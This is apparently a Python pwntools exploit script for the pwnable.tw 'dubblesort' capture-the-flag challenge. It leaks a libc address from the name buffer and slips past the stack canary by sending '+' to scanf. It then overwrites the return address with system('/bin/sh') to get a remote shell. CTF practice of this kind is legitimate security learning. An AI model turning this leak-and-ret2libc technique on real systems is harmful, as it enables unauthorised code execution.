from pwn import *
#io = process(['./dubblesort'])
io = remote('chall.pwnable.tw', 10101)
#pause()
context.log_level = 'debug'

io.recvuntil(":")
io.send('AAAA' * 6 + '\n') # name area has libc_addr which was left by __libc_start_main or smth
io.recvuntil('AAAA' * 6)
libc_addr = u32(io.recvn(4)) & 0xffffff00 #remote libc is different from libc in my local ubuntu 15.10
log.info('libc addr :' + hex(libc_addr))
l = ELF('/tmp/libc')
libc_main = libc_addr - 0x1b0000 
libc_system = libc_main + l.symbols['system']
libc_sh = libc_main + l.search('/bin/sh').next()
log.info('system addr :' + hex(libc_system))
print hex(l.symbols['system'])
print hex(libc_sh)

io.recvuntil(':')
io.sendline('35')
for i in range(0, 24):
    io.recvuntil(':')
    io.sendline('1')
io.recvuntil(':')
io.sendline('+') #+ or - can bypass scanf
io.send(7 * (str(libc_system) + '\n'))
pay = str(libc_system) + '\n'
pay += str(libc_system) + '\n'
pay += str(libc_sh) + '\n'
io.send(pay)
io.interactive()
